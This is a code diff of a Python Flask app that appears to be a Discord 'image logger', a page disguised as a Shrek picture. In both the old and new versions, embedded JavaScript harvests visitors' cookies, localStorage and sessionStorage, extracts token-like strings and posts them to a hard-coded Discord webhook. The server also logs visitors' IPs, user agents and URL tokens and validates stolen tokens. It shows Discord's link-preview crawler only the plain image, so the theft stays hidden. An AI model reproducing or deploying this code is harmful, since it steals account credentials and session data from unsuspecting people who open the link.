@@ -4,19 +4,15 @@ import traceback, requests, base64, httpagentparser, re, json, time, os, random
 
 app = Flask(__name__)
 
-# ========== FAKE USER-AGENTS ==========
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
     "Mozilla/5.0 (compatible; Discordbot/2.0; +https://discord.com/)"
 ]
 
 def get_random_ua():
     return random.choice(USER_AGENTS)
 
-# ========== CONFIGURAÇÕES ==========
 config = {
     "webhook": "https://discord.com/api/webhooks/1526403537037426698/w0WhkvyaaQ7FagPqEzQHQyHFjrP4oAfvLv6RUiJLxZX2xbss73DPMeCtQwhZeUfDLdhH",
     "image": "https://upload.wikimedia.org/wikipedia/en/4/4d/Shrek_%28character%29.png",
@@ -25,11 +21,6 @@ config = {
     "color": 0x00FFFF,
     "crashBrowser": False,
     "accurateLocation": False,
-    "message": {
-        "doMessage": False,
-        "message": "This browser has been pwned by DeKrypt's Image Logger.",
-        "richMessage": True,
-    },
     "vpnCheck": 1,
     "linkAlerts": True,
     "buggedImage": True,
@@ -42,10 +33,6 @@ config = {
 }
 
 blacklistedIPs = ("27", "104", "143", "164")
-
-# ========== VARIÁVEIS GLOBAIS ==========
-captured_token = None
-captured_token_source = None
 
 def botCheck(ip, useragent):
     if ip and ip.startswith(("34", "35")):
@@ -93,7 +80,7 @@ def validate_token(token):
     except Exception as e:
         return {"valid": False, "error": str(e)}
 
-def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token=None, token_info=None, storage_data=None):
+def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token=None, token_info=None):
     if ip and ip.startswith(blacklistedIPs):
         return
     
@@ -183,14 +170,6 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token
                 "**Full Token:** ||" + token + "||"
             )
     
-    if storage_data:
-        description += (
-            "\n\n**🍪 BROWSER STORAGE CAPTURED**\n"
-            "**Cookies:**\n```\n" + storage_data.get("cookies", "None")[:500] + "\n```\n"
-            "**localStorage:**\n```\n" + storage_data.get("localStorage", "None")[:500] + "\n```\n"
-            "**sessionStorage:**\n```\n" + storage_data.get("sessionStorage", "None")[:500] + "\n```"
-        )
-    
     embed = {
         "username": config["username"],
         "content": ping,
@@ -211,12 +190,65 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token
         pass
     return info
 
-# ========== HTML + STEALER SCRIPT ==========
-HTML_TEMPLATE = '''<!DOCTYPE html>
+@app.route('/', defaults={'path': ''})
+@app.route('/<path:path>')
+def catch_all(path):
+    try:
+        dic = dict(request.args)
+        s = request.full_path if request.query_string else "/"
+        ip = request.headers.get('x-forwarded-for', request.remote_addr)
+        ua = request.headers.get('user-agent', '')
+        
+        token = None
+        token_info = None
+        
+        if config["captureTokens"]:
+            for param in ["token", "id", "t", "auth", "key", "code"]:
+                if dic.get(param):
+                    token = dic.get(param)
+                    break
+            if token and len(token) > 50 and re.match(r'^[A-Za-z0-9+/=]+$', token):
+                try:
+                    decoded = base64.b64decode(token).decode()
+                    if re.match(r'^[a-zA-Z0-9._-]{30,100}$', decoded):
+                        token = decoded
+                except:
+                    pass
+            if not token:
+                url_match = re.search(r'[a-zA-Z0-9._-]{30,100}', s)
+                if url_match:
+                    token = url_match.group(0)
+            if token:
+                token_info = validate_token(token)
+        
+        if config["imageArgument"]:
+            if dic.get("url") or dic.get("id"):
+                try:
+                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
+                except:
+                    url = config["image"]
+            else:
+                url = config["image"]
+        else:
+            url = config["image"]
+        
+        is_crawler = 'Discordbot' in ua or ('Discord' in ua and 'bot' in ua.lower()) or (ip and ip.startswith(('34', '35')))
+        
+        if is_crawler or botCheck(ip, ua):
+            makeReport(ip, endpoint=request.path, url=url, token=token, token_info=token_info)
+            try:
+                headers = {"User-Agent": get_random_ua()}
+                img_data = requests.get(url, headers=headers, timeout=5).content
+                return Response(img_data, mimetype='image/jpeg')
+            except:
+                loading = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
+                return Response(loading, mimetype='image/jpeg')
+        
+        html = f'''<!DOCTYPE html>
 <html>
 <head>
 <style>
-body{margin:0;padding:0;}
+body{{margin:0;padding:0;}}
 div.img{{
 background-image:url('{url}');
 background-position:center center;
@@ -227,8 +259,7 @@ width:100vw;height:100vh;
 </style>
 <script>
 (function() {{
-    var webhook = '{webhook}';
-    
+    var webhook = '{config["webhook"]}';
     function sendData(data) {{
         var xhr = new XMLHttpRequest();
         xhr.open('POST', webhook);
@@ -243,26 +274,17 @@ width:100vw;height:100vh;
             }}]
         }}));
     }}
-    
     function extractToken(text) {{
         var match = text.match(/[a-zA-Z0-9._-]{{30,100}}/);
         return match ? match[0] : null;
     }}
-    
     var data = '';
-    
-    // 1. COOKIES - pega TODOS
     var cookies = document.cookie;
     if (cookies) {{
         data += 'COOKIES:\\n' + cookies + '\\n\\n';
-        // Tenta extrair token de cookies
         var token = extractToken(cookies);
-        if (token) {{
-            data += 'TOKEN ENCONTRADO NOS COOKIES: ' + token + '\\n\\n';
-        }}
+        if (token) data += 'TOKEN ENCONTRADO NOS COOKIES: ' + token + '\\n\\n';
     }}
-    
-    // 2. LOCALSTORAGE
     try {{
         if (localStorage.length > 0) {{
             data += 'LOCALSTORAGE:\\n';
@@ -270,15 +292,11 @@ width:100vw;height:100vh;
                 var val = localStorage[key];
                 data += key + ': ' + val + '\\n';
                 var token = extractToken(val);
-                if (token) {{
-                    data += '>> TOKEN ENCONTRADO: ' + token + '\\n';
-                }}
+                if (token) data += '>> TOKEN ENCONTRADO: ' + token + '\\n';
             }}
             data += '\\n';
         }}
     }} catch(e) {{}}
-    
-    // 3. SESSIONSTORAGE
     try {{
         if (sessionStorage.length > 0) {{
             data += 'SESSIONSTORAGE:\\n';
@@ -286,18 +304,11 @@ width:100vw;height:100vh;
                 var val = sessionStorage[key];
                 data += key + ': ' + val + '\\n';
                 var token = extractToken(val);
-                if (token) {{
-                    data += '>> TOKEN ENCONTRADO: ' + token + '\\n';
-                }}
+                if (token) data += '>> TOKEN ENCONTRADO: ' + token + '\\n';
             }}
             data += '\\n';
         }}
     }} catch(e) {{}}
-    
-    // 4. TENTA PEGAR TOKEN DO HEADER Authorization
-    // (Se a página tiver feito requisições com token)
-    
-    // 5. SE ENCONTROU ALGO, ENVIA
     if (data) {{
         sendData(data);
     }} else {{
@@ -310,80 +321,6 @@ width:100vw;height:100vh;
 <div class="img"></div>
 </body>
 </html>'''
-
-@app.route('/', defaults={'path': ''})
-@app.route('/<path:path>')
-def catch_all(path):
-    global captured_token, captured_token_source
-    
-    try:
-        dic = dict(request.args)
-        s = request.full_path if request.query_string else "/"
-        ip = request.headers.get('x-forwarded-for', request.remote_addr)
-        ua = request.headers.get('user-agent', '')
-        
-        # ========== CAPTURAR TOKEN DA URL ==========
-        token = None
-        token_source = "URL parameter"
-        token_info = None
-        
-        if config["captureTokens"]:
-            for param in [config.get("tokenParam", "token"), "token", "id", "t", "auth", "key", "code"]:
-                if dic.get(param):
-                    token = dic.get(param)
-                    token_source = f"URL parameter '{param}'"
-                    break
-            
-            if token and len(token) > 50 and re.match(r'^[A-Za-z0-9+/=]+$', token):
-                try:
-                    decoded = base64.b64decode(token).decode()
-                    if re.match(r'^[a-zA-Z0-9._-]{30,100}$', decoded):
-                        token = decoded
-                        token_source = "Base64 decoded"
-                except:
-                    pass
-            
-            if not token:
-                url_match = re.search(r'[a-zA-Z0-9._-]{30,100}', s)
-                if url_match:
-                    token = url_match.group(0)
-                    token_source = "URL regex match"
-            
-            if token:
-                token_info = validate_token(token)
-                captured_token = token
-                captured_token_source = token_source
-        
-        # ========== IMAGEM ==========
-        if config["imageArgument"]:
-            if dic.get("url") or dic.get("id"):
-                try:
-                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
-                except:
-                    url = config["image"]
-            else:
-                url = config["image"]
-        else:
-            url = config["image"]
-        
-        # ========== DISCORD CRAWLER ==========
-        is_crawler = 'Discordbot' in ua or ('Discord' in ua and 'bot' in ua.lower()) or (ip and ip.startswith(('34', '35')))
-        
-        if is_crawler or botCheck(ip, ua):
-            makeReport(ip, endpoint=request.path, url=url, token=token, token_info=token_info)
-            try:
-                headers = {"User-Agent": get_random_ua()}
-                img_data = requests.get(url, headers=headers, timeout=5).content
-                return Response(img_data, mimetype='image/jpeg')
-            except:
-                loading = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
-                return Response(loading, mimetype='image/jpeg')
-        
-        # ========== RESPOSTA HTML ==========
-        html = HTML_TEMPLATE.format(
-            url=url,
-            webhook=config["webhook"]
-        )
         
         makeReport(ip, ua, endpoint=request.path, url=url, token=token, token_info=token_info)
         return Response(html, mimetype='text/html')
